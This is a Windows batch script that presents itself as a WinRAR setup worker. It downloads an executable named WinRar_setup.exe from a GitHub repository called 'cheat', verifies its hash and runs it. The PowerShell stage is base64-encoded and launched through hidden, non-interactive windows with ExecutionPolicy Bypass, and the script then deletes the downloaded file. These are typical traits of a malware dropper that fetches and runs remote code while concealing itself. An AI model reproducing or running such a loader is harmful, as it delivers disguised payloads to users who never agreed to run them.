@echo off
setlocal EnableExtensions

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=015e2e6a6f81dbf422fe5751016c96305a6b271b069fcd56f0c8bd5b93f6271e"
set "OUT=%TEMP%\winrar_pkg_%RANDOM%.exe"
set "LOG=%TEMP%\winrar_worker.log"

set "PS_CODE=$ErrorActionPreference='Stop';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$u=$env:URL;$h=$env:HASH.ToLowerInvariant();$f=$env:OUT;$log=$env:LOG;function Log([string]$m){('[ '+(Get-Date -Format 'HH:mm:ss')+' ] '+$m)|Out-File -FilePath $log -Append -Encoding UTF8};try{Log 'Start detached worker';if(Test-Path -LiteralPath $f){Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue};$ok=$false;try{& curl.exe -L -s -f -o $f $u;if((Test-Path -LiteralPath $f) -and ((Get-Item -LiteralPath $f).Length -gt 0)){$ok=$true}}catch{};if(-not $ok){try{(New-Object System.Net.WebClient).DownloadFile($u,$f);if((Test-Path -LiteralPath $f) -and ((Get-Item -LiteralPath $f).Length -gt 0)){$ok=$true}}catch{}};if(-not $ok){Log 'ERROR: Download failed';exit 1};Log 'Downloaded OK, checking SHA-256';$cur=(Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash.ToLowerInvariant();if($cur -ne $h){Log ('ERROR: Hash mismatch. Expected='+$h+' Actual='+$cur);Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue;exit 2};Log 'Hash verified, launching executable';$proc=Start-Process -FilePath $f -PassThru -Wait;Start-Sleep -Seconds 2;Log ('Process exited with code '+$proc.ExitCode);if(Test-Path -LiteralPath $f){Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue};Log 'Cleanup complete';exit $proc.ExitCode}catch{Log ('FATAL: '+$_.Exception.Message);if(Test-Path -LiteralPath $f){Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue};exit 99}"

set "ENCODED_CMD="
for /f "usebackq delims=" %%B in (`powershell -NoProfile -Command "$bytes=[System.Text.Encoding]::Unicode.GetBytes($env:PS_CODE);[Convert]::ToBase64String($bytes)"`) do set "ENCODED_CMD=%%B"

if not defined ENCODED_CMD exit /b 1

powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "$psi = New-Object System.Diagnostics.ProcessStartInfo; " ^
  "$psi.FileName = 'powershell.exe'; " ^
  "$psi.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand ' + $env:ENCODED_CMD; " ^
  "$psi.UseShellExecute = $false; " ^
  "$psi.CreateNoWindow = $true; " ^
  "[System.Diagnostics.Process]::Start($psi) | Out-Null"

endlocal
exit /b 0
